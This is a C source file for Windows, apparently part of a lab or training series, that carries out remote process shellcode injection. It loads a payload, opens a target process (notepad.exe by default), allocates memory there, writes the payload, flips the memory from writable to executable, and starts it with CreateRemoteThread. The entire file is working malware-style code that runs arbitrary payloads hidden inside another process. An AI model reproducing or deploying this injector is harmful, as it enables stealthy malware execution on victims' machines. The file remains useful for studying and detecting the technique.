#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

int main(int argc, char* argv[]) {
    const char* targetProc = (argc > 1) ? argv[1] : "notepad.exe";

    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Finding target process");
    DWORD pid = FindProcessId(targetProc);
    if (!pid) {
        printf("[-] Process '%s' not found. Launch it first.\n", targetProc);
        free(payload);
        return 1;
    }
    printf("[+] Found %s (PID: %lu)\n", targetProc, pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { PrintError("OpenProcess failed"); free(payload); return 1; }

    PrintStep(3, "Allocating memory in remote process (RW)");
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { PrintError("VirtualAllocEx failed"); return 1; }
    printf("[+] Remote memory at: %p\n", remoteMem);

    PrintStep(4, "Writing payload to remote process");
    SIZE_T written;
    WriteProcessMemory(hProcess, remoteMem, payload, payloadSize, &written);
    printf("[+] Written %zu bytes\n", written);
    free(payload);

    PrintStep(5, "Changing remote memory protection (RW -> RX)");
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    PrintStep(6, "Creating remote thread");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) { PrintError("CreateRemoteThread failed"); return 1; }
    printf("[+] Remote thread created successfully\n");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
